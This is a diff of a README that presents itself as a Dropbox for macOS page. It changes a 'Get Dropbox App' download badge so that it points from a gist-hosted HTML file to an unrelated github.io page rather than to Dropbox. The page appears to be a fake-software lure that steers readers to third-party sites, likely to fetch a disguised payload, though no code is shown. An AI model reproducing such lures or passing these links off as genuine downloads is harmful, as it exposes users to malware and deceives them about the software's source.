@@ -3,7 +3,7 @@
 **Dropbox** for **macOS** is a reliable and secure cloud storage platform that keeps your files safe, synced, and accessible across all your devices.  
 With native Apple Silicon optimization, Dropbox integrates directly with Finder for effortless drag-and-drop file management. 🍎  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Dropbox%20App-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/dinorahbarashka-design/e2708c8c5df606d91931ce149a5b58c3/raw/a353c68185661e821be9fe1941fae35f02f4ce64/app.html?offer=DropboxMac)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Dropbox%20App-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=DropboxMac)
 
 ---
 
